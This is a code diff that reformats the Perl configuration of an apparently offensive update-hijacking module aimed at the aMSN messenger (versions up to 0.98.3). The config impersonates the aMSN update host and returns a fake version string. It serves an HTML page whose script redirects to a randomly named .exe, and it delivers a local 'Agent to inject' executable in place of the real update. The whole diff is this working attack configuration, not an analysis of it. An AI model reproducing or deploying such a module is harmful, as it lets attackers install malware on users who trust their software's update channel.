@@ -27,71 +27,73 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'aMSN',
-    'appver' => '<= 0.98.3',
-    'version' => '1.0',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => 'www.amsn-project.net',
-    'request' => [
-		    {
-		    'req' => '/amsn_latest', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',
-		    'string' => "<%VERSION%>",
-		    'parse' => '1',
-		    'file' => ''
-		    },
-		    {
-		    'req' => '.xml', #autoupdate plugins features no implemented
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',
-		    'string' => "",
-		    'parse' => '0',
-		    'file' => ''
-		    },
+my $base = {
+    'name'        => 'aMSN',
+    'appver'      => '<= 0.98.3',
+    'version'     => '1.0',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => 'www.amsn-project.net',
+    'request'     => [
+        {   'req'    => '/amsn_latest',    #regex friendly
+            'type'   => 'string',          #file|string|agent|install
+            'method' => '',                #any
+            'bin'    => '',
+            'string' => "<%VERSION%>",
+            'parse'  => '1',
+            'file'   => ''
+        },
+        {   'req'    => '.xml',    #autoupdate plugins features no implemented
+            'type'   => 'string',  #file|string|agent|install
+            'method' => '',        #any
+            'bin'    => '',
+            'string' => "",
+            'parse'  => '0',
+            'file'   => ''
+        },
 
-		    {
-		    'req' => '/$', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '<html><script>window.location="http://www.amsn-project.net/amsn<%RND1%>.exe"</script></html>',
-		    'parse' => 1,
-		    'file' => '',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+        {   'req'    => '/$',        #regex friendly
+            'type'   => 'string',    #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 0,
+            'string' =>
+                '<html><script>window.location="http://www.amsn-project.net/amsn<%RND1%>.exe"</script></html>',
+            'parse' => 1,
+            'file'  => '',
+        },
+        {   'req'    => '.exe',      #regex friendly
+            'type'   => 'agent',     #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
+
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => "'2.'.isrcore::utils::RndNum(3).'.'.isrcore::utils::RndNum(1)",
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => {  'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                            	  'dynamic' =>1,
-                            },			    	  
-			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val' =>
+                "'2.'.isrcore::utils::RndNum(3).'.'.isrcore::utils::RndNum(1)",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+
+    }
 };
-
-
 
 ##########################################################################
 # FUNCTION      new
